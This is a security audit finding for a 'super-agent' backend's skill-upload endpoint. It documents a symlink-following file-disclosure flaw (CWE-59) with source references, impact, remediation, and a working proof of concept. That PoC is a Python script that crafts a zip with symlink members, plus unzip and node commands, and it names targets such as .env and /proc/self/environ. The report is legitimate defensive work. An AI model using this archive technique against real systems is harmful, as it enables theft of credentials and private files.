# Archive symlink members dereferenced by fs.cp enable out-of-bounds file read into skill storage (zip/tar upload)

**ID:** vuln-0029
**Severity:** HIGH
**Found:** 2026-11-21 04:14:33 UTC
**Target:** super-agent backend (/workspace/agentcore-superagent-update/super-agent/backend)
**CWE:** CWE-59
**CVSS:** 7.1
**Confidence:** High
**Fix Effort:** Low

## Description

Symlink members inside an uploaded skill archive survive extraction (system `unzip -o` preserves symlinks) and are then dereferenced by `fs.cp` without `verbatimSymlinks` when the skill is copied to its permanent store and later into session workspaces, allowing an attacker to copy arbitrary out-of-archive files and directories into attacker-readable skill storage.

## Evidence

PoC executed in `/tmp/zip-poc` with the service's exact commands. (1) Hand-crafted zip containing unix symlink members `myskill/leaked.txt -> /tmp/zip-poc/outside/secret.txt` and `myskill/outside-link -> /tmp/zip-poc/outside`. (2) `unzip -o -q malicious.zip -d extractdir` — `ls -la extractdir/myskill` shows both symlinks preserved (`lrwxrwxrwx ... leaked.txt -> /tmp/zip-poc/outside/secret.txt`). (3) Node `fs.cp('extractdir/myskill','perm',{recursive:true})` (default `verbatimSymlinks:false`) — resulting `perm/leaked.txt` is a regular file containing the out-of-archive content `secret-marker-for-poc`, read back successfully.

## Impact

Out-of-bounds file disclosure: any file or directory readable by the backend process user (e.g. `.env`, config files, `data/` contents including other tenants' skill stores, `~/.aws/credentials` if readable) is copied into the attacker's skill directory, where it is retrievable via skill download, workspace provisioning, or the skill listing. A directory symlink whose target is writable also creates a write pivot: extraction of a later archive (or the copy itself) can write through the symlink into the targeted directory. Integrity impact is limited (writes through a pre-planted writable directory symlink); no availability impact.

## Counterevidence

Info-ZIP unzip and GNU tar both refuse `..` path members by default, so the classic zip-slip write via path traversal entries is blocked — this is the control that made the surface look safe. However, neither tool strips symlink members, and the subsequent `fs.cp` without `verbatimSymlinks` follows them (verified empirically), so the out-of-bounds read is confirmed reachable. Attack is limited to files readable by the backend process user; `unzip -o` overwrites existing extracted files only within the extract dir. This is a distinct sink from the filed vuln-0013 (arbitrary write via `../` in the skill name): here the write path stays inside the skill store; the defect is symlink following during copy, yielding a read primitive instead.

## Confidence Rationale

Local PoC executed with the exact extraction and copy commands the service uses (system `unzip -o -q`, Node `fs.cp(..., {recursive:true})` default flags), confirming both the symlink survival and the dereferencing copy; source trace verified for ingest, copy, and later workspace install.

## What Would Change This Severity

Demonstrating that a specific high-value secret (e.g. `.env` with auth secrets, or an S3/cloud credential readable by the backend user) is exfiltrable in a deployed configuration would raise this to high; a deployment where the backend user cannot read any sensitive files would lower it to medium.

## Technical Analysis

`POST /api/skills/marketplace/upload-zip` writes the uploaded archive to a temp file and extracts it with the system command `unzip -o -q <zip> -d <extractDir>` (`src/services/skill-marketplace.service.ts:800`), with a `tar -xzf` fallback for tar archives (line 804). Unlike `..` path entries (which both tools refuse), Info-ZIP unzip and GNU tar both recreate symlink members as real symlinks in the extract directory. The service then discovers `SKILL.md` files and copies each skill directory to the permanent store with `cp(skillDir, permDir, { recursive: true })` (line 843) — Node's `fs/promises.cp` with default `verbatimSymlinks: false` dereferences symlinks, so a symlink member pointing at any readable path on the host causes the target file's contents (or, for directory symlinks, the whole subtree) to be copied into the attacker-controlled skill directory. The same unguarded pattern repeats at `src/services/workspace-manager.ts:1361` (`installSkillToWorkspace`, which copies from the skill store into every session workspace) and `:976` (`downloadSkill`), so the dereferenced content also lands in workspace trees and the S3 skill mirror. Related sibling sinks in the same flow: `workspace-manager.ts:1049-1057` extracts downloaded skill zips with `unzip -o` (or `python3 -m zipfile -e`, which also preserves/creates symlinks on unix) directly into the workspace. This is a distinct sink from the filed vuln-0013 (name-based path traversal write): here the skill name is irrelevant — the symlink itself performs the escape at copy time and yields primarily an out-of-bounds read.

## Proof of Concept

1. Craft a zip containing a `SKILL.md` plus unix symlink members: one pointing at a secret file outside the archive (`myskill/leaked.txt -> /tmp/zip-poc/outside/secret.txt`) and one pointing at a directory (`myskill/outside-link -> /tmp/zip-poc/outside`). (In a real attack, target e.g. `/proc/self/environ` or the app's `.env`.)
2. Run the exact extraction command used by `installFromZip`: `unzip -o -q <zip> -d <extractDir>` — symlink members are preserved.
3. Run the exact copy used for the permanent store: Node `fs.cp(skillDir, permDir, {recursive:true})` with default options — the symlinks are dereferenced and out-of-archive content is copied into the skill store.
4. Read back the copied content from the skill store.

```bash
# /tmp/zip-poc — harmless local PoC replicating skill-marketplace.service.ts installFromZip flow
mkdir -p myskill outside && echo "secret-marker-for-poc" > outside/secret.txt
printf -- '---\nname: mys\ndescription: poc\n---\npoc\n' > myskill/SKILL.md
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('malicious.zip','w') as z:
    z.writestr('myskill/SKILL.md', open('myskill/SKILL.md').read())
    for name, target in [('myskill/leaked.txt','/tmp/zip-poc/outside/secret.txt'),
                         ('myskill/outside-link','/tmp/zip-poc/outside')]:
        zi = zipfile.ZipInfo(name); zi.create_system = 3
        zi.external_attr = (0o120777 << 16)   # unix symlink
        z.writestr(zi, target)
PY
mkdir -p extractdir && unzip -o -q malicious.zip -d extractdir   # service's exact cmd
node -e "require('fs/promises').cp('extractdir/myskill','perm',{recursive:true}).then(()=>{  \
  const fs=require('fs'); \
  console.log(fs.readdirSync('perm')); \
  console.log('leaked:', fs.readFileSync('perm/leaked.txt','utf8')); })"
# -> [ 'SKILL.md', 'leaked.txt', 'outside-link' ]
# -> leaked: secret-marker-for-poc   (out-of-archive file content, dereferenced by fs.cp)
```

## Remediation

Pass `verbatimSymlinks: true` to every `fs.cp` that copies extracted archive content (the permanent-store copy in `installFromZip`, and the workspace provisioning copies in `installSkillToWorkspace` and `downloadSkill`), then reject or strip any remaining symlinks in extracted skill directories. Preferably, reject any archive containing symlink or hardlink members at ingest time, mirroring the existing `..` entry protections, and validate post-extraction that no entry is a link before copying.

## Assumptions

Authenticated org member with skill upload/install permissions (the upload-zip route requires only `authenticate`). The attacker's goal is exfiltration of readable backend files or planting writable directories.
